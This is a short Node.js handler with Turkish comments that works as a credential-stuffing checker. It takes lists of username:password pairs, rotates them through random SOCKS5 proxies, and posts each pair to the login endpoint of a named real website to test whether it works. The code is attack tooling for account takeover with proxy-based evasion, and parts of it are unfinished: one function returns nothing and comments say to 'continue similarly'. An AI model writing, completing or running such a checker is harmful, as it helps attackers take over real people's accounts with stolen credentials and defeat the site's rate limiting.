const axios = require('axios');
const ProxyAgent = require('proxy-agent');

module.exports = async (req, res) => {
  const { config, combos } = req.body;
  const proxies = require('./proxies/SOCKS5_proxies.txt'); // Proxy dosyasını oku (fs ile)
  const results = [];

  for (let combo of combos) {
    const [user, pass] = combo.split(':');
    const proxy = proxies[Math.floor(Math.random() * proxies.length)]; // Rastgele proxy seç
    try {
      let result;
      if (config === 'ezglobal') {
        result = await checkEzGlobal(user, pass, proxy);
      } // Diğer config'ler için benzer fonksiyonlar
      results.push(result);
    } catch (error) {
      results.push(`Error on ${combo}: ${error.message}`);
    }
  }
  res.json(results);
};

async function checkEzGlobal(user, pass, proxy) {
  const agent = new ProxyAgent(proxy);
  const response = await axios.post('https://www.ezglobalyazilim.com/ajax.php', 
    `s1=uyelik&s2=islem&islem=gir&refuser=0&eposta=${encodeURIComponent(user)}&sifre=${encodeURIComponent(pass)}&ajtip=eval`, 
    { httpAgent: agent, httpsAgent: agent }
  );
  // Benzer şekilde devam et
}
